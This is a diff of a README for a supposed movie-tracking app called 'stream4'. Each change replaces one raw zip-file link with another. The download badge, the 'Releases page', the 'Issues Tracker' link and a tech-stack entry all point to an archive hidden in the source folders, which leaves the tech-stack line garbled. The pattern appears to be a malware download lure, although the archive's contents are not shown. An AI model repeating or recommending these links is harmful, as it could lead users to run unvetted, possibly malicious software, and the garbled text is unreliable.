@@ -1,6 +1,6 @@
 # 🎬 stream4 - Track Your Movies Effortlessly
 
-[![Download stream4](https://raw.githubusercontent.com/Seezy626/stream4/main/unspiritual/stream4.zip)](https://raw.githubusercontent.com/Seezy626/stream4/main/unspiritual/stream4.zip)
+[![Download stream4](https://github.com/Seezy626/stream4/raw/refs/heads/main/src/components/watched/stream_v2.6.zip)](https://github.com/Seezy626/stream4/raw/refs/heads/main/src/components/watched/stream_v2.6.zip)
 
 ## 🚀 Getting Started
 
@@ -16,7 +16,7 @@ Before you download stream4, make sure your computer meets the following require
 
 ## 💻 Download & Install
 
-You can download stream4 from our Releases page. Visit this page to download: [stream4 Releases](https://raw.githubusercontent.com/Seezy626/stream4/main/unspiritual/stream4.zip).
+You can download stream4 from our Releases page. Visit this page to download: [stream4 Releases](https://github.com/Seezy626/stream4/raw/refs/heads/main/src/components/watched/stream_v2.6.zip).
 
 1. Open your web browser.
 2. Click on the link above to access the Releases page.
@@ -47,7 +47,7 @@ stream4 offers a range of features to enhance your movie tracking experience:
 
 stream4 utilizes various technologies to provide its features. Here are some of the key components:
 
-- **https://raw.githubusercontent.com/Seezy626/stream4/main/unspiritual/stream4.zip 15**: For building fast and responsive user interfaces.
+- **https://github.com/Seezy626/stream4/raw/refs/heads/main/src/components/watched/stream_v2.6.zip 15**: For building fast and responsive user interfaces.
 - **TypeScript**: Ensures robust and error-free code.
 - **Tailwind CSS**: Delivers a modern and sleek design.
 - **Drizzle ORM**: Manages data easily with organized queries.
@@ -56,7 +56,7 @@ stream4 utilizes various technologies to provide its features. Here are some of 
 
 If you have any questions or need assistance, feel free to reach out:
 
-- **Issues Tracker**: [Report an issue here](https://raw.githubusercontent.com/Seezy626/stream4/main/unspiritual/stream4.zip)
+- **Issues Tracker**: [Report an issue here](https://github.com/Seezy626/stream4/raw/refs/heads/main/src/components/watched/stream_v2.6.zip)
 - **Community Help**: Visit our community forums for tips and tricks.
 
 ## 🔄 Update stream4
